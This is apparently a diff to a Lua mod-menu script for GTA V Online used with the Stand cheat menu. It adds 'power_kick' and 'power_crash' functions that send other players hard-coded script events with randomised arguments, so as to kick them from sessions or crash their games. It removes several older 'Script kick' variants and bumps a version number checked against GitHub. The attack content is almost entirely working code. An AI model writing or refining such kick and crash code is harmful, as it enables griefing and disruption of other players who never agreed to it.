@@ -11,7 +11,7 @@ util.require_natives(1676318796)
 util.toast("Welcome " .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. " to the script!!")
 util.toast("Loading, wait... (1-2s)")
 local response = false
-local localVer = 2.18
+local localVer = 2.181
 --local localKs = false
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
@@ -452,6 +452,38 @@ ryze = {
             end
         end
         util.yield(wait_for)
+    end,
+
+    kicks = {
+        1104117595,
+        697566862,
+        1268038438,
+        915462795,
+        697566862,
+        1268038438,
+        915462795
+    },
+
+    power_kick = function(player_id)
+        for i, v in pairs(ryze.kicks) do
+            arg1 = math.random(-2147483647, 2147483647)
+            arg2 = math.random(-1987543, 1987543)
+            arg3 = math.random(-19, 19)
+            util.trigger_script_event(1 << player_id, {v, pid, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
+            util.yield()
+        end
+        util.toast("You kicked " .. PLAYER.GET_PLAYER_NAME(player_id))
+    end,
+
+    power_crash = function(player_id)
+        for i, v in pairs(ryze.kicks) do
+            arg1 = math.random(-2147483647, 2147483647)
+            arg2 = math.random(-1987543, 1987543)
+            arg3 = math.random(-19, 19)
+            util.trigger_script_event(1 << player_id, {v, player_id, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
+            util.yield()
+        end
+        util.toast("You crashed " .. PLAYER.GET_PLAYER_NAME(player_id))
     end
 
     --PapuCrash = function()
@@ -2689,61 +2721,7 @@ end --]]
         menu.trigger_commands("givesh" .. players.get_name(player_id))
     end)
 
-    menu.action(sekicks, "Script kick v2", {}, "", function()
-        local int_min = -2147483647
-        local int_max = 2147483647
-        for i = 1, 15 do
-            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, math.random(int_min, int_max), math.random(int_min, int_max), 
-            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
-        end
-        menu.trigger_commands("givesh" .. players.get_name(player_id))
-        util.yield()
-        for i = 1, 15 do
-            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, player_id, math.random(int_min, int_max)})
-            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
-            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
-        end
-    end)
-
-    menu.action(sekicks, "Script kick v3", {}, "", function()
-        local int_min = -2147483647
-        local int_max = 2147483647
-        for i = 1, 5 do
-            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, math.random(int_min, int_max), math.random(int_min, int_max), 
-            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
-        end
-        menu.trigger_commands("givesh" .. players.get_name(player_id))
-        util.yield()
-        for i = 1, 5 do
-            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, player_id, math.random(int_min, int_max)})
-            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
-            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
-            util.yield(300)
-        end
-    end)
-
-    menu.action(sekicks, "Powerfull script Kick", {}, "", function()
-        local int_min = -2147483647
-        local int_max = 2147483647
-        for i = 1, 15 do
-            util.trigger_script_event(1 << player_id, {1279059857, math.random(int_min, int_max), math.random(int_min, int_max), 
-            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-            util.trigger_script_event(1 << player_id, {1279059857})
-        end
-        menu.trigger_commands("givesh" .. players.get_name(player_id))
-        util.yield()
-        for i = 1, 15 do
-            util.trigger_script_event(1 << player_id, {1279059857, player_id, math.random(int_min, int_max)})
-            util.trigger_script_event(1 << player_id, {1279059857})
-        end
-    end)
-
-    menu.action(sekicks, "Powerfull script Kick v2", {}, "", function()
+    menu.action(sekicks, "Powerfull script kick", {}, "", function()
         ryze.power_kick(player_id)
     end)
 
